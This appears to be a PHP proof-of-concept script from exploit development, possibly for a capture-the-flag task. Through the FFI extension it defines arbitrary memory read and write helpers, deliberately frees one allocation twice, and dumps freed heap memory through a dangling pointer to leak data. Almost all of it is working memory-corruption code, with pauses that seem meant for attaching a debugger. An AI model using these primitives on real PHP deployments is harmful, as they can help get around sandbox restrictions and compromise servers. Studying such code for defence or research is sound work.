<?php 

function hex_dump($data, $newline="\n")
{
  static $from = '';
  static $to = '';

  static $width = 16; # number of bytes per line

  static $pad = '.'; # padding for non-visible characters

  if ($from==='')
  {
    for ($i=0; $i<=0xFF; $i++)
    {
      $from .= chr($i);
      $to .= ($i >= 0x20 && $i <= 0x7E) ? chr($i) : $pad;
    }
  }

  $hex = str_split(bin2hex($data), $width*2);
  $chars = str_split(strtr($data, $from, $to), $width);

  $offset = 0;
  foreach ($hex as $i => $line)
  {
    echo sprintf('%6X',$offset).' : '.implode(' ', str_split($line,2)) . ' [' . $chars[$i] . ']' . $newline;
    $offset += $width;
  }
}

function u64($strng){
    $val = 0;
    for($i = 0; $i < 8; ++$i){
        $val |= (ord($strng[$i]) << ($i*8));
    }
    return $val;
}

function hex($val){
    return dechex($val);
}


function arb_read($addr, $size=0x8){
    return FFI::string(FFI::cast("char *", $addr), $size);
}

function arb_write($addr, $val){
    $sice = FFI::cast("long long *", $addr);
    $sice[0] = $val;
}

$ip = FFI::new("int [800]", false);
$ip2 = FFI::new("int [800]", false);

$ptr_sice = FFI::addr($ip);
$ptr_sice2 = FFI::addr($ip);

for($i = 0; $i < 0x100; $i++){
    $ip[$i] = 0x41414141;
}

readline("LOL");

FFI::free($ip);
FFI::free($ip);

$read_data = FFI::string($ptr_sice, 100);
hex_dump($read_data);

//hex_dump(arb_read($ptr_leak + 0x1000*0, 0x20));

readline("LLL");

?>
